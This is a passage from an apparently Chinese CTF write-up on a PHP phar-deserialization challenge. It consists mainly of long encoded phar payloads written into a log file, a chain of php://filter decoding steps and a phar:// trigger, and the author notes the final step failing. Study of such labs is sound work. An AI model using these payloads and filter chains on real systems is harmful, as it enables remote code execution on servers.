class="hljs-number">00</span>j=<span class="hljs-number">00</span>g=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>u=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>W=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>c=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>k=<span class="hljs-number">001</span>=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>b=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>e=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>L=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>q=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>Y=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>N=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>b=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>v=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>E=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>g=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>b=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>k=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>E=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>X=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>A=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>u=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>h=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>X=<span class="hljs-number">008</span>=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>H=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>/=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>k=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>w=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>r=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D</code></pre>
<p>之后直接复制进去访问log/error.txt，接下来就要用到伪协议和过滤器（后面步骤要点击重写文件）</p>
<pre><code class="hljs scss">php://filter/read=consumed/resource=log/error.txt
//可以先用这个删除error.txt文件内容，防止文件内容过多造成后续base64解码报错</code></pre>
<p>解码quoted-printable</p>
<pre><code class="hljs scss">php://filter/read=convert.quoted-printable-decode/resource=log/error.txt</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314210636888.png" alt="image-20240314210636888"></p>
<p>解码UCS-2</p>
<pre><code class="hljs scss">php://filter/read=convert.iconv.UCS-<span class="hljs-number">2</span>.UTF-<span class="hljs-number">8</span>/resource=log/error.txt</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314211604484.png" alt="image-20240314211604484"></p>
<pre><code class="hljs scss">php://filter/write=convert.base64-decode/resource=log/error.txt</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314211913669.png" alt="image-20240314211913669"></p>
<pre><code class="hljs scss">phar://log/error.txt</code></pre>
<p>这里不知道为什么，到了最后一步总是报错，phar似乎不能绕过，我采用wp的答案也不行，感觉是环境寄了。。。</p>
<p>第二天又看了看，经过文章的仔细比对发现payload不一样，如下图所示，除了第二个，其他都是正确的。</p>
<p>这里我也不知道为何，链子跟师傅们感觉一样，但就是出不来，之后换用师傅们的链子出来过一次，但我自己原来的写法也是一致的感觉，很奇怪</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240315082601481.png" alt="image-20240315082601481"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315082623850.png" alt="image-20240315082623850"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315084313385.png" alt="image-20240315084313385"></p>
<p>这里放个最终的payload得了，感觉是环境问题</p>
<pre><code class="hljs scss">=<span class="hljs-number">00</span>R=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>D=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>X=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>X=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>V=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>K=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>k=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>D=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>+=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>q=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>A=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>g=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>u=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>W=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>c=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>k=<span class="hljs-number">001</span>=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>b=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>e=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>L=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>q=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>Y=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>N=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>b=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>v=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>E=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>e=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>m=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>c=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>m=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>Z=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>l=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>I=<span 